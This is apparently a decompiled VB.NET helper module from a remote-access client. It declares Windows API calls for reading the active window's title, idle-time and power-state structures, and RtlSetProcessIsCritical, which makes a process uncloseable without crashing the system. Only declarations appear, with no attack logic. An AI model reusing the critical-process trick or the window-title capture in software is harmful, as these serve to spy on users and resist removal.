Imports System
Imports System.Runtime.InteropServices
Imports System.Text

Namespace Client.Helper
	' Token: 0x02000015 RID: 21
	Public Module NativeMethods
		' Token: 0x06000060 RID: 96
		Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr

		' Token: 0x06000061 RID: 97
		Public Declare Function GetWindowText Lib "user32.dll" (hWnd As IntPtr, text As StringBuilder, count As Integer) As Integer

		' Token: 0x06000062 RID: 98
		Public Declare Sub RtlSetProcessIsCritical Lib "ntdll.dll" (v1 As UInteger, v2 As UInteger, v3 As UInteger)

		' Token: 0x02000016 RID: 22
		Public Enum EXECUTION_STATE As UInteger
			' Token: 0x04000034 RID: 52
			ES_CONTINUOUS = 2147483648UI
			' Token: 0x04000035 RID: 53
			ES_DISPLAY_REQUIRED = 2UI
			' Token: 0x04000036 RID: 54
			ES_SYSTEM_REQUIRED = 1UI
		End Enum

		' Token: 0x02000017 RID: 23
		Friend Structure LASTINPUTINFO
			' Token: 0x04000037 RID: 55
			Public Shared SizeOf As Integer = Marshal.SizeOf(GetType(NativeMethods.LASTINPUTINFO))

			' Token: 0x04000038 RID: 56
			<MarshalAs(UnmanagedType.U4)>
			Public cbSize As UInteger

			' Token: 0x04000039 RID: 57
			<MarshalAs(UnmanagedType.U4)>
			Public dwTime As UInteger
		End Structure
	End Module
End Namespace
